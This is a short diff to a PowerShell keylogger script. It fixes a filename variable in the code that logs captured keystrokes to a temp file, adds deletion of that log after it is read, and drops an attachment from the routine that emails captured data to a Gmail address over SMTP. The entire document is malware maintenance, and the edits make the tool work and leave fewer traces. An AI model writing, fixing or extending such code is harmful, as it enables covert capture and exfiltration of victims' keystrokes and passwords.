@@ -80,7 +80,7 @@ function script:Keylogger
                 $now = Get-Date; 
                 $logLine = "$result " 
                 $filename = "$env:temp\key.log" 
-                Out-File -FilePath $fileName -Append -InputObject "$logLine" 
+                Out-File -FilePath $filename -Append -InputObject "$logLine" 
 
             }
         }
@@ -105,7 +105,8 @@ function script:Keylogger
             $read = 0
             Start-Sleep -Seconds 60
 			
-			$data = Get-Content "$env:temp\key.log"
+			$data = Get-Content $filename
+			Remove-Item -path $filename
 			$keys = $data.split("   ");
 			$out = ""
 			foreach ($i in $keys)
@@ -259,11 +260,6 @@ function script:Keylogger
 			$msg.To.Add("$username@gmail.com")
 			$msg.Subject = $pastename
 			$msg.Body = $pastevalue
-			if ($filename)
-			{
-				$att = new-object Net.Mail.Attachment($filename)
-				$msg.Attachments.Add($att)
-			}
 			$smtp.Send($msg)
         }
     }
